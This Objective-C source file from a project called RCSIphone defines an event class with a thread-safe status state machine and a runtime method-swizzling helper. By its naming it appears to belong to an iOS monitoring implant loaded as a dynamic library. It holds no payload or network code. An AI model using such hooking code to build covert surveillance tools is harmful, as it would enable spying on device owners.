//
//  RCSIDylibEvents.m
//  RCSIphone
//
//  Created by kiodo on 14/06/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//
#import <objc/runtime.h>

#import "RCSIDylibEvents.h"

@implementation dylibEvents

@synthesize mEventConfiguration;
@synthesize mEventID;
@synthesize mThread;

- (id)init
{
  self = [super init];
  if (self) 
    {
      [self setMEventConfiguration:nil];
      mEventStatus = AGENT_STATUS_STOPPED;
      mThread = nil;
    }
  
  return self;
}

- (id)initWithConfigData:(NSData*)aData
{
  self = [super init];
  if (self) 
    {
      [self setMEventConfiguration:aData];
      mEventStatus = AGENT_STATUS_STOPPED;
      mThread = nil;
    }
  
  return self;
}

- (void)dealloc
{
  [mEventConfiguration release];
  [mThread release];
  [super dealloc];
}

- (BOOL)isThreadCancelled
{
  return [[NSThread currentThread] isCancelled];
}

- (void)cancelThread
{
  [mThread cancel];
}

- (u_int)mEventStatus
{
  u_int status;
  
  @synchronized(self)
  {
  status = mEventStatus;
  }
  
  return status;
}

- (u_int)setMEventStatus:(u_int)aStatus
{
  u_int status;
  
  @synchronized(self)
  {
  /* 
   * status == stopped  -> status->running
   * status == running  -> status=stopping or status=stopped
   * status == stopping -> status=stopping or status=stopped
   */
  switch (mEventStatus)
    {
      case EVENT_STATUS_STOPPED:
      if (aStatus == EVENT_STATUS_RUNNING)
        {
          mEventStatus = aStatus;
        }
      break;
      case EVENT_STATUS_RUNNING:
      if (aStatus == EVENT_STATUS_STOPPING || aStatus == EVENT_STATUS_STOPPED)
        {
          mEventStatus = aStatus;
        }
      break;
      case EVENT_STATUS_STOPPING:
      if (aStatus == EVENT_STATUS_STOPPED)
        {
          mEventStatus = aStatus;
        }
      break;
    }
  
  status = mEventStatus;
  }
  
  return status;
}

- (BOOL)swizzleByAddingIMP:(Class)aClass 
                   withSEL:(SEL)originalSEL
            implementation:(IMP)newImplementation
              andNewMethod:(SEL)newMethod
{
  Method methodOriginal = class_getInstanceMethod(aClass, originalSEL);
  
  if (methodOriginal == nil)
    return FALSE;
  
  const char *type  = method_getTypeEncoding(methodOriginal);
  
  class_addMethod (aClass, newMethod, newImplementation, type);
  
  Method methodNew = class_getInstanceMethod(aClass, newMethod);
  
  if (methodNew == nil)
    return FALSE;
  
  method_exchangeImplementations(methodOriginal, methodNew);
  
  return TRUE;
}

- (BOOL)start
{
  return YES;
}
- (void)stop;
{
  
}

@end
